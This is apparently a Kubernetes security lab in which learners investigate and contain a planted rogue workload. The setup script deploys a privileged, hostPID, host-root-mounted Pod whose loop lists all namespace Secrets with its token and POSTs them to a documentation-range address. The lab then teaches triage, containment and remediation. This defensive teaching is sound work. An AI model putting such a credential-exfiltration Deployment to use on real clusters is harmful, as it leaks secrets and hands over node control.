---
title: "Lab CKS-14 — Investigating an Unknown Incident"
tags:
  [
    kubernetes,
    labs,
    cks,
    incident-response,
    investigation,
    containment,
    runtime-security,
  ]
date: 2026-10-13
description: A namespace contains one workload that is doing something it should not. Find it without being told which, establish what it did and with whose permissions, then contain it while keeping the evidence.
---

# Lab CKS-14 — Investigating an Unknown Incident

The other runtime-security labs trigger a known event and then find it: you already know which Pod and which string to search for. Real investigation runs the other way. This lab plants a problem in a namespace of ordinary workloads and gives you only a vague report. You establish **which** workload, **what** it is doing, **what it could reach**, and **how to stop it without destroying the evidence**.

The answers are in collapsed blocks. Open each one only after writing down your own.

Concepts: [[Kubernetes/concepts/L07-security/02-workload-sandboxing/18-runtime-detection|Runtime Detection]], [[Kubernetes/concepts/L07-security/01-api-access/03-rbac|RBAC]] and [[Kubernetes/concepts/L08-operations/02-kubectl-debug|kubectl Debug Toolkit]].

Tested 2026-10-13 on kind v0.33.0 with Kubernetes v1.37.0.

> [!note] What this lab does not have
> The cluster has no audit log and no Falco, so the evidence is limited to what the API objects, the Pod and the node show. That is deliberate: it is what you have when detection tooling was not in place. With [[Kubernetes/labs/cks/03-audit-logging|audit logging]] enabled you could also answer "who created this and when did it first read a Secret"; section 6 says where that evidence would come from.

---

## 1. Prerequisites & Starting State

- Working `k8s-lab` cluster from **[[Kubernetes/labs/ckad/01-cluster-setup|Lab CKAD-01]]** and `jq`. No other lab is required.

Run the setup **without reading it**. It is long on purpose.

```bash
cat << 'SETUP' > incident-setup.sh
kubectl create namespace shop
for A in catalog cart checkout; do
  kubectl -n shop create deployment $A --image=ghcr.io/stefanprodan/podinfo:6.7.1 --replicas=2
done
kubectl -n shop create secret generic payment-api-key --from-literal=key=sk_live_51Hxxxx
kubectl -n shop create serviceaccount metrics-agent
kubectl -n shop create role metrics-agent --verb=get,list --resource=secrets,pods
kubectl -n shop create rolebinding metrics-agent --role=metrics-agent --serviceaccount=shop:metrics-agent
kubectl -n shop apply -f - << 'Y'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: metrics-agent
  labels:
    app: metrics-agent
spec:
  replicas: 1
  selector:
    matchLabels:
      app: metrics-agent
  template:
    metadata:
      labels:
        app: metrics-agent
    spec:
      serviceAccountName: metrics-agent
      hostPID: true
      containers:
        - name: agent
          image: curlimages/curl:8.10.1
          securityContext:
            privileged: true
            runAsUser: 0
          command:
            - sh
            - -c
            - |
              T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
              while true; do
                curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/shop/secrets -o /tmp/.cache
                curl -s -m 3 -X POST --data-binary @/tmp/.cache http://198.51.100.23:8443/upload >/dev/null 2>&1
                echo "metrics pushed"
                sleep 20
              done
          volumeMounts:
            - name: host
              mountPath: /host
      volumes:
        - name: host
          hostPath:
            path: /
Y
SETUP

sh incident-setup.sh > /dev/null 2>&1
sleep 30
```

The destination address in the setup, `198.51.100.23`, is from a range reserved for documentation. Nothing is sent anywhere.

---

## 2. The Report

> "The network team saw repeated outbound connection attempts from the cluster to an address nobody recognises, on port 8443. They think it is coming from the `shop` namespace. Nothing is alerting."

**Your tasks**, in this order. Suggested time: 25 minutes.

1. Identify the workload responsible.
2. State what it is doing, with evidence you could show someone.
3. State what it has access to: in the API, and on the node.
4. Contain it so that it can do no further harm, **without deleting the Pod**.
5. List what must be done afterwards.

---

## 3. Triage: Which Workload?

Do not start by reading logs Pod by Pod. Ask the API for the properties that make a workload dangerous, across the whole namespace in one view:

```bash
kubectl -n shop get pods -o custom-columns='NAME:.metadata.name,SA:.spec.serviceAccountName,PRIV:.spec.containers[*].securityContext.privileged,HOSTPID:.spec.hostPID,HOSTNET:.spec.hostNetwork,HOSTPATH:.spec.volumes[*].hostPath.path,IMAGE:.spec.containers[*].image'
```

Then look for what does not fit: a different image, a different ServiceAccount, host access, or a different age. `kubectl -n shop get rolebinding,role` shows which identities have been given API access.

> [!hint]- Answer: which workload
>
> ```
> NAME                             SA              PRIV     HOSTPID   HOSTNET   HOSTPATH   IMAGE
> cart-7978dc5f79-ns5xh            default         <none>   <none>    <none>    <none>     ghcr.io/stefanprodan/podinfo:6.7.1
> catalog-5b9d57f648-d78jp         default         <none>   <none>    <none>    <none>     ghcr.io/stefanprodan/podinfo:6.7.1
> checkout-548675f9d5-bllbl        default         <none>   <none>    <none>    <none>     ghcr.io/stefanprodan/podinfo:6.7.1
> metrics-agent-5d8d5b886d-5qfqc   metrics-agent   true     true      <none>    /          curlimages/curl:8.10.1
> ```
>
> `metrics-agent` stands out on every column: its own ServiceAccount, `privileged`, the host's PID namespace, the node's whole filesystem mounted, and an image that is a general-purpose HTTP client. Its name is chosen to look routine. A plausible name is not evidence of anything.
>
> None of that proves it is the source of the connections. It makes it the first thing to examine.

---

## 4. What Is It Doing?

Gather evidence from three places, from least to most intrusive: the object's specification, the Pod's output, and the processes on the node. Prefer methods that do not change the Pod.

```bash
P=$(kubectl -n shop get pod -l app=metrics-agent -o jsonpath='{.items[0].metadata.name}')

kubectl -n shop get pod "$P" -o jsonpath='{.spec.containers[0].command}{"\n"}'
kubectl -n shop logs "$P" --tail=3
kubectl -n shop exec "$P" -- sh -c 'ps -o pid,args; ls -la /tmp'
```

From the node, which works even when the container has no shell:

```bash
NODE=$(kubectl -n shop get pod "$P" -o jsonpath='{.spec.nodeName}')
CID=$(kubectl -n shop get pod "$P" -o jsonpath='{.status.containerStatuses[0].containerID}' | sed 's#containerd://##')

docker exec "$NODE" crictl inspect "$CID" | jq -r '.info.pid'
docker exec "$NODE" sh -c "ps -eo pid,ppid,user,args | grep -E 'curl|upload' | grep -v grep"
```

> [!hint]- Answer: what it is doing
> The log says only `metrics pushed`, which is the cover story. The command and the process list say otherwise:
>
> ```
> 76017  sh -c T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) while true; do
>          curl -sk -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/shop/secrets -o /tmp/.cache
>          curl -s -m 3 -X POST --data-binary @/tmp/.cache http://198.51.100.23:8443/upload ...
> 76056  curl -s -m 3 -X POST --data-binary @/tmp/.cache http://198.51.100.23:8443/upload
>
> -rw-r--r--    1 root     root           877 Oct 13 11:50 /tmp/.cache
> ```
>
> Every 20 seconds it uses its ServiceAccount token to **list every Secret in the namespace**, writes the response to a hidden file, and **posts that file to `198.51.100.23:8443`**, the address in the report. `grep -c payment-api-key /tmp/.cache` confirms the file contains the payment key.
>
> The node's process list shows the same `curl` running as `root`, with the container's main process as its parent. That ties the network activity to this container independently of anything the container says about itself.

---

## 5. What Could It Reach?

Two separate questions: what its identity may do in the API, and what the Pod can do to the node.

```bash
kubectl auth can-i --list -n shop --as=system:serviceaccount:shop:metrics-agent | grep -vE "selfsubject|^\s+\["
kubectl -n shop get rolebinding -o wide
kubectl -n shop exec "$P" -- sh -c 'id; ls /host | head -n 5; ls /host/etc/kubernetes 2>/dev/null'
```

> [!hint]- Answer: blast radius
> **API.** A Role and RoleBinding named `metrics-agent` grant `get` and `list` on `secrets` and `pods` in `shop`. Assume every Secret in the namespace is disclosed, whatever was actually sent: `payment-api-key` and any ServiceAccount token Secrets.
>
> **Node.** The container runs as `root`, `privileged`, with `hostPID` and the node's `/` mounted at `/host`. That is full control of the node it runs on: it can read the kubelet's credentials under `/host/var/lib/kubelet`, every other Pod's mounted Secrets and volumes on that node, and on a control-plane node the cluster's CA keys under `/host/etc/kubernetes/pki`. Treat the **node** as compromised, not only the Pod.
>
> **Scope.** The Role is namespaced, so the API access stops at `shop`. The node access does not respect namespaces at all: any Pod scheduled on that node was exposed.

---

## 6. Contain It

The instinct is `kubectl delete pod`. That destroys the process list, the files in `/tmp` and the logs, and the Deployment immediately starts an identical replacement, so it achieves nothing. Contain in an order that stops the harm first and keeps the Pod.

Work out your own sequence before opening the answer. Things to consider: what recreates the Pod, what the Pod uses to talk to the API, what it uses to talk to the outside, and what happens to a Pod when its labels change.

> [!hint]- Answer: containment sequence
> **1. Revoke the access.** RBAC changes apply at once, to running Pods too:
>
> ```bash
> kubectl -n shop delete rolebinding metrics-agent
> kubectl auth can-i list secrets -n shop --as=system:serviceaccount:shop:metrics-agent     # no
> ```
>
> **2. Cut the network.** A NetworkPolicy with no rules for a label, then give the Pod that label:
>
> ```bash
> kubectl -n shop apply -f - << 'EOF'
> apiVersion: networking.k8s.io/v1
> kind: NetworkPolicy
> metadata:
>   name: quarantine
> spec:
>   podSelector:
>     matchLabels:
>       quarantine: "true"
>   policyTypes: ["Ingress", "Egress"]
> EOF
> ```
>
> **3. Take the Pod away from its controller and stop the controller.** Order matters here. Removing the `app` label releases the Pod from the ReplicaSet, which keeps it alive as evidence, but the ReplicaSet then **creates a replacement** that is just as malicious. Scale the Deployment to zero as part of the same step:
>
> ```bash
> kubectl -n shop label pod "$P" app- quarantine=true
> kubectl -n shop scale deployment metrics-agent --replicas=0
> kubectl -n shop get pods | grep metrics-agent
> ```
>
> ```
> metrics-agent-5d8d5b886d-5qfqc   1/1     Running   0          2m
> ```
>
> One Pod remains: the original, unowned, labelled `quarantine=true`, with no API permissions and no network. Confirm from inside it:
>
> ```bash
> kubectl -n shop exec "$P" -- sh -c 'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
>   curl -sk -m 4 -o /dev/null -w "api: %{http_code} (curl exit %{exitcode})\n" \
>     -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/shop/secrets'
> ```
>
> ```
> api: 000 (curl exit 28)
> ```
>
> A timeout: the request no longer leaves the Pod. Before the policy it would have been a `403` from step 1.
>
> **4. Stop new workloads landing on the node**, since the node is suspect: `kubectl cordon "$NODE"`. Do not drain it yet; draining moves the other Pods and their evidence.
>
> **5. Preserve evidence** before anything else changes:
>
> ```bash
> kubectl -n shop get pod "$P" -o yaml > evidence-pod.yaml
> kubectl -n shop get deployment metrics-agent -o yaml > evidence-deployment.yaml
> kubectl -n shop logs "$P" > evidence-logs.txt
> kubectl -n shop exec "$P" -- cat /tmp/.cache > evidence-exfil-payload.json
> kubectl -n shop get events --sort-by=.lastTimestamp > evidence-events.txt
> ```
>
> A NetworkPolicy does not confine a Pod that uses `hostNetwork`, and nothing here confines a privileged container's access to its node. Containment through the API buys time; it is not a clean bill of health.

---

## 7. Afterwards

> [!hint]- Answer: what must follow
> | Action | Why |
> | :--- | :--- |
> | Rotate `payment-api-key` and every Secret in `shop`, at the issuer and in the cluster | They were read and an upload was attempted. Deleting the Kubernetes object does not invalidate a key held by someone else |
> | Replace the node, or rebuild it | A privileged container with the host filesystem could have changed anything on it, including the kubelet |
> | Rotate the kubelet's credentials for that node, and the cluster CA if it was a control-plane node | They were readable from `/host` |
> | Find out who created the Deployment, Role and RoleBinding | `metadata.creationTimestamp` and `managedFields` give the time and the client; the **audit log** gives the user and source address. Without audit logging this question may have no answer |
> | Delete the Deployment, ServiceAccount, Role and, once analysed, the quarantined Pod | Clean-up comes last |
> | Prevent the next one | Enforce Pod Security `baseline` or `restricted` on the namespace, which rejects `privileged`, `hostPID` and `hostPath` outright ([[Kubernetes/labs/cks/01-workload-security-hardening\|Lab CKS-01]]); default-deny egress; alert on privileged Pods and on `list secrets` by ServiceAccounts ([[Kubernetes/labs/cks/06-falco-runtime-detection\|Falco]], [[Kubernetes/labs/cks/03-audit-logging\|audit logging]]) |
>
> The single control that would have stopped this workload from starting is one namespace label: `pod-security.kubernetes.io/enforce=baseline`.

---

## 8. Cleanup

```bash
kubectl uncordon "$NODE" 2>/dev/null
kubectl delete namespace shop
rm -f incident-setup.sh evidence-*
```

---

## Practise Again, Differently

The method matters more than this particular answer. To rehearse it on something you have not seen, ask a colleague to change the setup before you run it, or change one thing yourself and return after a few days. Variations that alter the evidence:

- the workload is a **CronJob**, so most of the time no Pod is running;
- it uses the `default` ServiceAccount, to which someone bound a role, so no unusual identity stands out;
- it is not privileged, but mounts the container runtime socket;
- the suspicious Pod is in a different namespace from the one reported.

In each case the same four questions apply: which workload, doing what, able to reach what, and stopped how.

---

## Further reading

- [Kubernetes security checklist](https://kubernetes.io/docs/concepts/security/security-checklist/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Debug running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)

## Next Lab

This is the last CKS lab. Return to the [[Kubernetes/certifications/cks|CKS Track]], or test yourself with the [[Kubernetes/certifications/cks-mock-exam|CKS practice set]].
